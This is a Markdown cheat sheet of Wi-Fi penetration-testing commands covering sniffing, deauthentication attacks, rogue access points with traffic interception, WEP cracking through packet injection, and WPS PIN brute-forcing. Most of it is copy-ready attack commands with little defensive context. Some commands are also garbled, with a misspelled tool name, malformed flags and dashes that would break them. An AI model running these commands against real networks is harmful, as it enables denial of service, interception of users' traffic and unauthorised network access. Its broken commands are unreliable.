# Wifi Penetration Testing

## Change MAC adress

```Bash
> ifconfig wlan0 down
> macchanger —random wlan0
> ifconfig wlan0 up
```

 Wifi card default mode is **“managed mode”** only capture data packets that contains it’s MAC address.

In **“monitor mode”** it captures every data packet in it’s wifi range

## Enable monitor mode

```Bash
> ifconfig wlan0 down
> airmon-ng start wlan0
##( Some times it does not work) || OR use ||
> iwconfig wlan0 mode monitor
```

## Packet sniffing

### To sniff all packets from all networks around you

```Bash
> airodump-ng mon0
## || OR ||
> airodump-ng wlan0 ## whateva the name of wlan in monitor mode
```

### To sniff all the packets from a specific network

```Bash
> airodump-ng —channel 2 —bssid 00:a2:23:23:43:53 —write out mon0
```

## De-authentication attacks practical

### To de-authenticate all clients in a specific network

```Bash
## aireplay-ng —deauth [number of packets] -a [AP] [interface]
> aireplay-ng —deauth 1000 -a 11:22:33:44:55:66 mon0
```

### To de-authenticate a specific client in a network

```Bash
## First we will run airodump-ng to see which devices (stations) are connected to this network.
> airodump-ng —channel 2 —bssid 00:a2:23:23:43:53 mon0

## aireplay-ng —deauth [number of packets] -a [AP] -c [target] [interface]
> aireplay-ng —deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:22:33:44:55:66 mon0
```

## Creating Fake AP

```Bash
## install dns masq (Only do this once)
> apt-get install dnsmasq

## Edit dhcp configuration
> echo -e "interface=at0\ndhcp-range=192.168.0.50,192.168.0.150,12h" > /etc/dnsmasq.conf

## start fake ap
## airbase-ng -e [network name] -c [channel] interface
> airbase-ng -e fake-ap -c 6 mon0
> ifconfig at0 192.168.0.1 up

## Removing iptables rules
> iptables --flush
> iptables --table nat --flush
> iptables --delete-chain

## Enable packet forwarding in iptables
> iptables -P FORWARD ACCEPT

## link the wifi card and the card that's connected to the internet
> iptables -t nat -A POSTROUTING -o [internet interface] -j MASQUERADE

## start dnsmasq
> dnsmasq

## Enable ip forward
> echo "1" > /proc/sys/net/ipv4/ip_forward
```

## Creating fake access point using Mana-Toolkit

### It has 3 main scripts

1. **start-noupstream:** starts AP with NO internet connection.
1. **start-nat-simple:** starts a regular AP using internet connection in upstream interface.
1. **start-nat-full:** starts AP with internet connection, it also starts sslstrip, sslsplit, firelamp and attempts to bypass HTST. <kbd>_{{Sometimes this script is not working}}_</kbd>

```Bash
## install Mana-Toolkit
> apt-get install mana-toolkit

## Modify configuration files
> vim /etc/mana-toolkit/hostapd-karma.conf
> vim /usr/share/mana-toolkit/run-mana/start-nat-simple.sh

# run the script
> bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
```

## WEP Cracking

- WEP is an old encryption, but it's still used in some networks.
- It uses an algorithm called [RC4] where each packet is encrypted at the AP and then decrepted at the client.
- WEP insures that each packet has a unique key stream by using a random 24 bit _initialization vector [IV]_
- IV is contained in the packets as a plain text.
- The short IV means in a busy network we can collect more than two packets with the same IV, then we can use aircrack-ng to determine the key stream and the WEP key using statistical attacks.
- **Conclusion:** More IV's we captue, the more likely for us to crack the key.

### Simple WEP cracking (In case of a busy network with active users and high IV rate)

```Bash
## Run airodump-ng to log all traffic from the target network
## airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]
> airodump-ng --channel 6 --bssid 11:22:33:44:55:66 --write out mon0

## At the same time we shall use aircrack-ng to try and crack the capture file created by the above command
> aircrack-ng out-01.cap

## Keep both programs running at the same time and aircrack-ng will be able to determine the key when the number of IVs in out-01.cap is enough.
```

### Packet Injection

#### Fake authentication

```Bash
## aireplay-ng --fakeauth [number of packets] -a [target MAC] -h [your MAC] [interface]
>  aireplay-ng --fakeauth 0 -a 00:AA:22:33:44:55:66 -h 00:11:22:33:44:55:66 mon0
## Id this fake authentication was successful, The value under the "AUTH" column in airodump-ng will change to "OPN"
```

#### ARP request reply

```Bash
## aireplay-ng --arpreply -b [target MAC] -h [your MAC] [interfce]
> aireplay-ng --arpreply -b 00:AA:22:33:44:55:66 -h 00:11:22:33:44:55:66 mon0
```

#### Korek chop chop

```Bash
## 1. Capture the packet and determine it's key start-noupstream
## aireplay-ng --chopchop -b [target MAC] -h [your MAC] [interface]
> aireplay-ng --chopchop -b 00:AA:22:33:44:55:66 -h 00:11:22:33:44:55:66 mon0

## 2. Forge a new packet
## packetforge-ng -0 -a [target MAC] -h [your MAC] -k 255.255.255.255 -l 255.255.255.255 -y [output from last step.xor] - w [output]
> packetforge-ng -0 -a 00:AA:22:33:44:55:66 -h 00:11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y 1122out.xor - w chop-out

## 3. Inject the forged packet into the traffic to generate new IV's
## aireplay-ng -2 -r [out from last step] [interface]
> aireplay-ng -2 -r chop-out mon0
```

#### Fragmentation attack

- The goal of this method is to obtain 1500 bytes of the PRGA (pseudo random generation algorithm), this can be used to forge a new oachet which can be injeted into the traffic to generate new IV's

```Bash
## 1. Obtain PRGA
## airplay-ng --fragment -b [target MAC] -h [your MAC] [interface]
> airplay-ng --fragment -b 00:AA:22:33:44:55:66 -h 00:11:22:33:44:55:66 mon0

## 2. Forge a new packet
## packetforge-ng -0 -a [target MAC] -h [your MAC] -k 255.255.255.255 -l 255.255.255.255 -y [output from last step.xor] - w [output]
> packetforge-ng -0 -a 00:AA:22:33:44:55:66 -h 00:11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y 1122out.xor - w chop-out

## 3. Inject the forged packet into the traffic to generate new IV's
## aireplay-ng -2 -r [out from last step] [interface]
> aireplay-ng -2 -r chop-out mon0
```

## WPA / WPA2 Cracking

### WPS feature

- WPS allows users to connect to WPS enabled networks easily using WPS button on the router or by clicking on WPS functionality in router configuration.
- Authentication is done using **8 digit long pin**
- Using brute force we can guess the pin in < 10 hours.
- A tool called **reaver** can then recover the WPA/WPA2 key from this pin.

```Bash
## To scan for WPS enabed networks
> wash -i mon0 --ignore-fcs

## Start Cracking WPS pin with reaver
> reaver -b [target MAC] -c [channel] -i mon0
```
